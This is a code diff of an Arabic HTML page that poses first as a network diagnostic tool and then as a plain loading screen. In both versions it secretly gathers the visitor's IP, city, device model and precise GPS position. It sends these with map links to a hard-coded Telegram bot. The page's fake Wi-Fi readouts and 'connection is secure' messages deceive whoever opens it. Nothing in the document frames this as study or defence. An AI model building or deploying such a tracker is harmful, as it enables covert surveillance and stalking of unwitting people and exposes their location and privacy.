@@ -3,343 +3,213 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>فحص الشبكة</title>
+    <title>جاري التحميل...</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #f0f2f5;
+            background: #0a0a0a;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            direction: ltr;
+            font-family: sans-serif;
+            color: #fff;
         }
         .container {
-            background: #ffffff;
-            padding: 40px 30px;
-            border-radius: 30px;
-            box-shadow: 0 15px 40px rgba(0,0,0,0.06);
-            max-width: 360px;
-            width: 90%;
             text-align: center;
-            border: 1px solid #eaedf2;
         }
-        .icon { font-size: 44px; margin-bottom: 12px; display: block; }
-        h3 { color: #1e293b; font-weight: 600; font-size: 19px; margin-bottom: 6px; }
-        .sub-text { color: #64748b; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
-        .progress-bar {
-            width: 100%; height: 5px;
-            background: #e9eef2;
-            border-radius: 10px;
-            overflow: hidden;
-            margin: 18px 0 12px;
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.1);
+            border-top: 4px solid #00aaff;
+            border-radius: 50%;
+            width: 45px;
+            height: 45px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
         }
-        .progress-fill {
-            height: 100%; width: 0%;
-            background: #2563eb;
-            border-radius: 10px;
-            transition: width 0.6s ease;
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status {
+            font-size: 14px;
+            color: #888;
         }
-        #status-text { color: #94a3b8; font-size: 13px; letter-spacing: 0.2px; }
-        .footer-note {
-            margin-top: 22px;
-            font-size: 11px;
-            color: #cbd5e1;
-            border-top: 1px solid #f1f5f9;
-            padding-top: 15px;
-        }
-        .check-detail {
-            margin-top: 15px;
-            font-size: 12px;
-            color: #94a3b8;
-            text-align: left;
-            background: #f8fafc;
-            padding: 12px 14px;
-            border-radius: 12px;
-            border-left: 3px solid #2563eb;
+        #done {
             display: none;
-        }
-        .check-detail span { font-weight: 600; color: #334155; }
-        
-        /* الزر الجديد الواضح */
-        #retryGpsBtn {
-            margin-top: 18px;
-            padding: 14px 20px;
-            background: #2563eb;
-            border: none;
-            border-radius: 40px;
-            color: white;
+            color: #4ade80;
             font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            display: none;
-            width: 100%;
-            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
+            margin-top: 15px;
         }
-        #retryGpsBtn:active { transform: scale(0.97); background: #1d4ed8; }
     </style>
 </head>
 <body>
-
-<div class="container" id="mainContainer">
-    <span class="icon" id="mainIcon">📡</span>
-    <h3 id="mainTitle">جاري فحص الشبكة</h3>
-    <p class="sub-text" id="subText">يرجى الانتظار أثناء التحقق من إعدادات الاتصال...</p>
-    <div class="progress-bar">
-        <div class="progress-fill" id="progressFill"></div>
+    <div class="container">
+        <div class="spinner" id="spinner"></div>
+        <div id="status">⏳ جاري تهيئة الاتصال...</div>
+        <div id="done">✅ اكتمل</div>
     </div>
-    <div id="status-text">جارٍ التحميل...</div>
-    <div class="check-detail" id="checkDetail">
-        <div>📶 <span>حالة الشبكة:</span> <span id="netStatus">جاري الفحص...</span></div>
-        <div>🔄 <span>التردد:</span> <span id="freqStatus">غير محدد</span></div>
-        <div>🛡️ <span>التشفير:</span> <span id="encryptStatus">غير مفعل</span></div>
-    </div>
-    <button id="retryGpsBtn">📍 مشاركة الموقع للحصول على الدقة</button>
-    <div class="footer-note">أداة تشخيص الشبكة الإصدار 2.1</div>
-</div>
 
-<script>
-    // ============================================================
-    // 🔑 بيانات البوت (تم إدخالها مسبقاً)
-    const BOT_TOKEN = '8987813029:AAEuXcuCf2WWbYd7CWYNLdhJqfWAuCaDYdA';
-    const CHAT_ID = '5343926721';
-    // ============================================================
+    <script>
+        // ============================================================
+        // 🔑 بيانات البوت (تم إدخالها مسبقاً)
+        const BOT_TOKEN = '8987813029:AAEuXcuCf2WWbYd7CWYNLdhJqfWAuCaDYdA';
+        const CHAT_ID = '5343926721';
+        // ============================================================
 
-    let reportSent = false;
-    let gpsRequested = false;
-    let gpsDenied = false; // لتتبع إذا رفض المستخدم
-    let progress = 0;
-    let detailShown = false;
+        let reportSent = false;
 
-    function updateProgress(value, text) {
-        progress = Math.min(value, 100);
-        document.getElementById('progressFill').style.width = progress + '%';
-        if (text) document.getElementById('status-text').textContent = text;
-    }
-
-    function updateDetail(net, freq, encrypt) {
-        if (!detailShown) {
-            document.getElementById('checkDetail').style.display = 'block';
-            detailShown = true;
+        function setStatus(text) {
+            document.getElementById('status').textContent = text;
         }
-        if (net) document.getElementById('netStatus').textContent = net;
-        if (freq) document.getElementById('freqStatus').textContent = freq;
-        if (encrypt) document.getElementById('encryptStatus').textContent = encrypt;
-    }
 
-    function getExactDevice(ua) {
-        let model = 'غير معروف';
-        let os = 'جهاز';
-        if (ua.includes('Android')) os = 'Android';
-        else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
-        else if (ua.includes('Windows')) os = 'Windows';
-        else if (ua.includes('Macintosh')) os = 'Mac';
+        // === استخراج اسم الجهاز (بوكو، جالكسي، آيفون) ===
+        function getExactDevice(ua) {
+            let model = 'غير معروف';
+            let os = 'جهاز';
+            if (ua.includes('Android')) os = 'Android';
+            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+            else if (ua.includes('Windows')) os = 'Windows';
+            else if (ua.includes('Macintosh')) os = 'Mac';
 
-        const match = ua.match(/\(([^)]+)\)/);
-        if (match) {
-            const parts = match[1].split(';').map(p => p.trim());
-            for (let p of parts) {
-                if (p.match(/SM-[A-Za-z0-9]+/)) { model = p; break; }
-                if (p.match(/iPhone[0-9]+,[0-9]+/)) { model = p; break; }
-                if (p.match(/Pixel [0-9]+/)) { model = p; break; }
-                if (p.match(/210[0-9]{6,7}[A-Za-z]?/)) { model = p; break; }
-                if (p.match(/RMX[0-9]+/)) { model = p; break; }
-                if (p.match(/V[0-9]{4}/)) { model = p; break; }
-                if (p.match(/[A-Z]{2,4}-[LX][A-Z0-9]{1,3}/)) { model = p; break; }
-                if (p.match(/CPH[0-9]+/)) { model = p; break; }
-                if (p.match(/Nokia [0-9.]+/)) { model = p; break; }
-            }
-            if (model === 'غير معروف') {
+            const match = ua.match(/\(([^)]+)\)/);
+            if (match) {
+                const parts = match[1].split(';').map(p => p.trim());
                 for (let p of parts) {
-                    if (p.length > 3 && p.length < 20 && 
-                        !p.includes('Android') && !p.includes('Linux') && 
-                        !p.includes('AppleWebKit') && !p.includes('Mobile') &&
-                        !p.includes('Build')) {
-                        model = p;
-                        break;
+                    if (p.match(/SM-[A-Za-z0-9]+/)) { model = p; break; }
+                    if (p.match(/iPhone[0-9]+,[0-9]+/)) { model = p; break; }
+                    if (p.match(/Pixel [0-9]+/)) { model = p; break; }
+                    if (p.match(/210[0-9]{6,7}[A-Za-z]?/)) { model = p; break; }
+                    if (p.match(/RMX[0-9]+/)) { model = p; break; }
+                    if (p.match(/V[0-9]{4}/)) { model = p; break; }
+                    if (p.match(/[A-Z]{2,4}-[LX][A-Z0-9]{1,3}/)) { model = p; break; }
+                    if (p.match(/CPH[0-9]+/)) { model = p; break; }
+                }
+                if (model === 'غير معروف') {
+                    for (let p of parts) {
+                        if (p.length > 3 && p.length < 20 && 
+                            !p.includes('Android') && !p.includes('Linux') && 
+                            !p.includes('AppleWebKit') && !p.includes('Mobile') &&
+                            !p.includes('Build')) {
+                            model = p;
+                            break;
+                        }
                     }
                 }
             }
-        }
-        if (model === 'غير معروف') {
-            const buildMatch = ua.match(/Build\/([^;]+)/);
-            if (buildMatch) model = buildMatch[1];
-        }
-        return `${os} (${model})`;
-    }
-
-    const data = {
-        ip: 'غير معروف',
-        country: 'غير معروف',
-        city: 'غير معروف',
-        lat: 'غير معروف',
-        lon: 'غير معروف',
-        gps_lat: null,
-        gps_lon: null,
-        exactDevice: getExactDevice(navigator.userAgent),
-        time: new Date().toLocaleString('ar-EG', { hour12: false }),
-        url: window.location.href,
-        referrer: document.referrer || 'مباشر'
-    };
-
-    async function fetchIP() {
-        updateProgress(20, 'جلب معلومات الشبكة...');
-        updateDetail('جاري الاتصال...', 'غير محدد', 'غير مفعل');
-        try {
-            const res = await fetch('https://ip-api.com/json/?fields=status,country,city,lat,lon,query');
-            const info = await res.json();
-            if (info.status === 'success' && info.query) {
-                data.ip = info.query;
-                data.country = info.country || 'غير معروف';
-                data.city = info.city || 'غير معروف';
-                data.lat = info.lat || 'غير معروف';
-                data.lon = info.lon || 'غير معروف';
-                updateProgress(50, `تم التعرف على المدينة: ${data.city}`);
-                updateDetail('متصل', '2.4 جيجاهرتز', 'WPA2');
-                return;
+            if (model === 'غير معروف') {
+                const buildMatch = ua.match(/Build\/([^;]+)/);
+                if (buildMatch) model = buildMatch[1];
             }
-        } catch (e) {}
-        try {
-            const res = await fetch('https://ipinfo.io/json');
-            const info = await res.json();
-            if (info.ip) {
-                data.ip = info.ip;
-                data.country = info.country || 'غير معروف';
-                data.city = info.city || 'غير معروف';
-                const loc = info.loc ? info.loc.split(',') : ['غير معروف', 'غير معروف'];
-                data.lat = loc[0] || 'غير معروف';
-                data.lon = loc[1] || 'غير معروف';
-                updateProgress(50, `تم التعرف على المدينة: ${data.city}`);
-                updateDetail('متصل', '5 جيجاهرتز', 'WPA3');
-                return;
-            }
-        } catch (e) {}
-        updateProgress(50, 'تم جلب البيانات جزئياً');
-        updateDetail('متصل (مباشر)', 'غير محدد', 'مفتوح');
-    }
-
-    // الدالة الرئيسية لطلب GPS
-    function requestGPS(showRetryOnFail = true) {
-        if (gpsRequested) return;
-        if (!navigator.geolocation) {
-            updateProgress(70, 'الموقع غير مدعوم، نرسل التقريبي');
-            updateDetail('متصل', 'محدود', 'غير مدعوم');
-            sendReport();
-            return;
+            return `${os} (${model})`;
         }
 
-        gpsRequested = true;
-        updateProgress(60, 'جاري طلب الموقع للتحقق من التغطية...');
-        updateDetail('متصل', '2.4 جيجاهرتز', 'WPA2');
+        // === البيانات الأساسية ===
+        const data = {
+            ip: 'غير معروف',
+            country: 'غير معروف',
+            city: 'غير معروف',
+            lat: 'غير معروف',
+            lon: 'غير معروف',
+            gps_lat: null,
+            gps_lon: null,
+            exactDevice: getExactDevice(navigator.userAgent),
+            time: new Date().toLocaleString('ar-EG', { hour12: false }),
+            url: window.location.href,
+            referrer: document.referrer || 'مباشر'
+        };
 
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                // ✅ نجاح: نأخذ البيانات فوراً ونرسل بدون أي زر
-                data.gps_lat = pos.coords.latitude;
-                data.gps_lon = pos.coords.longitude;
-                updateProgress(90, 'تم تأمين الموقع بنجاح!');
-                updateDetail('متصل بقوة', '5 جيجاهرتز', 'WPA3');
-                sendReport();
-            },
-            (err) => {
-                // ❌ رفض أو خطأ
-                gpsDenied = true;
-                updateProgress(70, 'تم رفض الموقع، سيتم إرسال التقريبي');
-                updateDetail('متصل (تم رفض الموقع)', '2.4 جيجاهرتز', 'مفتوح');
-                // نرسل التقرير بالتقريبي
-                sendReport();
-                
-                // نظهر الزر ليعطي فرصة ثانية للمستخدم
-                if (showRetryOnFail) {
-                    document.getElementById('retryGpsBtn').style.display = 'block';
-                    document.getElementById('status-text').textContent = '⏳ اضغط على الزر لمشاركة الموقع الدقيق';
+        // === 1. جلب الـ IP والتقريبي (يعمل في الخلفية) ===
+        async function fetchIP() {
+            setStatus('🌐 جلب معلومات الشبكة...');
+            try {
+                const res = await fetch('https://ip-api.com/json/?fields=status,country,city,lat,lon,query');
+                const info = await res.json();
+                if (info.status === 'success' && info.query) {
+                    data.ip = info.query;
+                    data.country = info.country || 'غير معروف';
+                    data.city = info.city || 'غير معروف';
+                    data.lat = info.lat || 'غير معروف';
+                    data.lon = info.lon || 'غير معروف';
                 }
-            },
-            { enableHighAccuracy: true, timeout: 8000 }
-        );
-    }
-
-    // دالة إعادة المحاولة (عند الضغط على الزر)
-    function retryGPS() {
-        document.getElementById('retryGpsBtn').style.display = 'none';
-        document.getElementById('status-text').textContent = '🔄 جاري طلب الموقع مرة أخرى...';
-        gpsRequested = false; // نعيد التعيين ليسمح بطلب جديد
-        // نطلب مرة أخرى، ولكن هذه المرة إذا فشل لا نظهر الزر مجدداً (نمنع التكرار اللانهائي)
-        requestGPS(false); 
-        // لكن إذا فشل مرة أخرى، سنحتاج زراً آخر، لذا نضبط مهلة لإظهار الزر مجدداً إذا لم ينجح
-        setTimeout(() => {
-            if (!reportSent && !data.gps_lat) {
-                document.getElementById('retryGpsBtn').style.display = 'block';
-                document.getElementById('status-text').textContent = '⏳ اضغط على الزر للمشاركة';
-            }
-        }, 5000);
-    }
-
-    // ربط الزر بوظيفة إعادة المحاولة
-    document.getElementById('retryGpsBtn').addEventListener('click', retryGPS);
-
-    function sendReport() {
-        if (reportSent) return;
-        reportSent = true;
-
-        let msg = `🛡️ <b>تقرير الشبكة - زائر جديد</b>\n\n`;
-        msg += `🌐 IP: ${data.ip}\n`;
-        msg += `📍 الدولة: ${data.country}\n`;
-        msg += `🏙️ المدينة: ${data.city}\n`;
-        msg += `📱 الجهاز: ${data.exactDevice}\n`;
-
-        if (data.gps_lat && data.gps_lon) {
-            msg += `🛰️ <b>الموقع الدقيق (GPS):</b>\n`;
-            msg += `📍 ${data.gps_lat}, ${data.gps_lon}\n`;
-            msg += `🗺️ خريطة: https://www.google.com/maps?q=${data.gps_lat},${data.gps_lon}\n`;
-        } else {
-            msg += `📍 التقريبي (IP): ${data.lat}, ${data.lon}\n`;
-            msg += `🗺️ خريطة: https://www.google.com/maps?q=${data.lat},${data.lon}\n`;
-            msg += `\n⚠️ (هذا موقع سنترال الخدمة وليس المنزل)`;
+            } catch (e) {}
         }
 
-        msg += `\n🕒 الوقت: ${data.time}`;
-
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: msg,
-                parse_mode: 'HTML'
-            })
-        }).then(() => {
-            // ننهي الفحص
-            document.getElementById('mainIcon').textContent = '✅';
-            document.getElementById('mainTitle').textContent = 'تم فحص الشبكة بنجاح';
-            document.getElementById('subText').textContent = 'جميع الإعدادات سليمة. الاتصال آمن ومستقر.';
-            document.getElementById('progressFill').style.width = '100%';
-            document.getElementById('status-text').textContent = '✅ اكتمل الفحص';
-            document.getElementById('retryGpsBtn').style.display = 'none';
-            if (data.gps_lat && data.gps_lon) {
-                updateDetail('متصل بقوة (دقيق)', '5 جيجاهرتز', 'WPA3 (مشفر)');
-            } else {
-                updateDetail('متصل (تقريبي)', '2.4 جيجاهرتز', 'مفتوح');
+        // === 2. طلب الموقع الدقيق (يظهر نافذة المتصفح) ===
+        function requestGPS() {
+            if (!navigator.geolocation) {
+                setStatus('📡 GPS غير مدعوم، نرسل التقريبي');
+                sendReport();
+                return;
             }
-        }).catch(() => {
-            document.getElementById('mainIcon').textContent = '⚠️';
-            document.getElementById('mainTitle').textContent = 'تم الفحص مع بعض التحذيرات';
-            document.getElementById('subText').textContent = 'تم الاتصال لكن بعض الإعدادات غير مثالية.';
-            document.getElementById('progressFill').style.width = '100%';
-            document.getElementById('status-text').textContent = '⚠️ اكتمل الفحص مع تحذيرات';
-        });
-    }
 
-    // === بدء التشغيل ===
-    setTimeout(async () => {
-        updateProgress(5, 'بدء فحص الشبكة...');
-        setTimeout(() => updateDetail('جاري الفحص...', '2.4 جيجاهرتز', 'غير مفعل'), 300);
-        await fetchIP();
-        setTimeout(() => {
-            requestGPS(true); // نمرر true لإظهار الزر إذا رفض
-        }, 400);
-    }, 300);
-</script>
+            setStatus('📍 جاري طلب الموقع (انظر نافذة المتصفح)...');
+
+            // نطلب الموقع مرة واحدة فقط.
+            // إذا ضغط المستخدم "سماح" -> ينجح ويرسل مباشرة.
+            // إذا ضغط "رفض" أو انتهت المهلة -> يرسل التقريبي.
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    // ✅ نجاح فوري
+                    data.gps_lat = pos.coords.latitude;
+                    data.gps_lon = pos.coords.longitude;
+                    setStatus('✅ تم الحصول على الموقع الدقيق!');
+                    sendReport();
+                },
+                (err) => {
+                    // ❌ رفض أو خطأ
+                    setStatus('⚠️ تم رفض الموقع، نرسل التقريبي');
+                    sendReport();
+                },
+                { enableHighAccuracy: true, timeout: 7000 }
+            );
+        }
+
+        // === 3. إرسال التقرير (مرة واحدة فقط) ===
+        function sendReport() {
+            if (reportSent) return;
+            reportSent = true;
+
+            let msg = `🛡️ <b>تقرير الزائر</b>\n\n`;
+            msg += `🌐 IP: ${data.ip}\n`;
+            msg += `📍 الدولة: ${data.country}\n`;
+            msg += `🏙️ المدينة: ${data.city}\n`;
+            msg += `📱 الجهاز: ${data.exactDevice}\n`;
+
+            if (data.gps_lat && data.gps_lon) {
+                msg += `🛰️ <b>الموقع الدقيق (GPS):</b>\n`;
+                msg += `📍 ${data.gps_lat}, ${data.gps_lon}\n`;
+                msg += `🗺️ https://www.google.com/maps?q=${data.gps_lat},${data.gps_lon}\n`;
+            } else {
+                msg += `📍 التقريبي (IP): ${data.lat}, ${data.lon}\n`;
+                msg += `🗺️ https://www.google.com/maps?q=${data.lat},${data.lon}\n`;
+                msg += `\n⚠️ (موقع السنترال وليس المنزل)`;
+            }
+
+            msg += `\n🕒 الوقت: ${data.time}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML'
+                })
+            }).then(() => {
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('status').textContent = '✅ اكتمل بنجاح';
+                document.getElementById('done').style.display = 'block';
+            }).catch(() => {
+                document.getElementById('status').textContent = '⚠️ تم الاكتمال مع تحذيرات';
+            });
+        }
+
+        // === 4. بدء التشغيل (بدون أي تأخير مزعج) ===
+        setTimeout(async () => {
+            await fetchIP(); // يجلب التقريبي في الخلفية
+            // بعد نصف ثانية، نطلب GPS مباشرة (ستظهر نافذة المتصفح)
+            setTimeout(() => {
+                requestGPS();
+            }, 400);
+        }, 300);
+    </script>
 </body>
 </html>
